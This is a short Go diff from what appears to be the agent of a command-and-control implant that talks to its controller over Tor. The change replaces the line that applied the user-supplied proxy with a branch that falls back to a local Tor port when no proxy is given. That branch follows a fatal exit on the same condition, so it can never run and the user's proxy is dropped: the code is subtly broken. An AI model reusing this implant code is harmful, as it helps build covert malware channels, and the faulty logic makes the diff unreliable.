@@ -87,7 +87,9 @@ func main() {
 		if *c2proxy == "" {
 			log.Fatalf("CC is on TOR (%s), you have to specify a tor proxy for it to work", agent.CCAddress)
 		}
-		agent.HTTPClient = tun.EmpHTTPClient(*c2proxy)
+		if *c2proxy == "" {
+			agent.HTTPClient = tun.EmpHTTPClient("127.0.0.1:9050")
+		}
 	}
 
 	// if user specified a proxy, use it
